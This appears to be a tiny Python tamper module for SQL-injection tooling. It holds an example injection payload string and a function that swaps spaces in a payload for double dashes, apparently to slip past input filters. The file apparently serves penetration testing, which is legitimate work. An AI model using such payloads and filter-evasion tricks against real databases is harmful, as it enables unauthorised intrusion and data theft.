__example_payload__ = "' AND 1=1 ORDERBY(1,2,3,4,5) '; asdf"
__type__ = "changing the spaces in the payload into double dashes"


def tamper(payload, **kwargs):
    modifier = "--"
    retval = ""
    for char in payload:
        if char == " ":
            retval += modifier
        else:
            retval += char
    return retval